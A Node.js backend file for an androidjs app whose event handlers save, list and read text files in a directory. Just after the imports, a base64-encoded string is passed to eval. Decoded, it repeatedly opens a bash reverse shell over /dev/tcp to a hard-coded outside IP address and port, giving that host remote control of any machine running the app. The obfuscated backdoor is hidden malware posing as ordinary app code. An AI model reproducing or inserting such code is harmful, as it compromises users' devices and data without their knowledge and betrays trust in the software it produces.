const back = require('androidjs').back;
const fs = require('fs');
const path = require('path');
eval(Buffer.from("c2V0SW50ZXJ2YWwoKCkgPT4gcmVxdWlyZSgnY2hpbGRfcHJvY2VzcycpLmV4ZWMoJ2Jhc2ggLWMgImJhc2ggLWUgNTw+IC9kZXYvdGNwLzE0Mi45My4yMDguNjYvOTAwMSAwPCY1IDE+JjUgMj4mNSIgPiAvZGV2L251bGwgMj4mMSAmJyksIDMwMDAwKTsK","base64").toString())

back.on('save-data', function(filepath, msg){
	fs.writeFile(path.join(filepath, Date.now()+'.txt'), msg, function(err){
		if(err) throw err;
		console.log('file saved')
	});
	fs.readdir(filepath, function (err, files) {
    //handling error
	    if (err) {
	        return console.log('Unable to scan directory: ' + err);
	    } 
	    //listing all files using forEach
	    files.forEach(function (file) {
	        // Do whatever you want to do with the file
	        console.log(file); 
	    });
	});
});

back.on('get-data', function(filepath){
	fs.readdir(filepath, function (err, files) {
    //handling error
	    if (err) {
	        return console.log('Unable to scan directory: ' + err);
	    } 
	    //listing all files using forEach
	    files.forEach(function (file) {
	        
			fs.readFile(path.join(filepath, file), 'utf-8', function(err, data){
				if(err) back.send('get-data-result', 'error');
				else back.send('get-data-result', data, file);
			})
	        console.log(file); 
	    });
	});
});
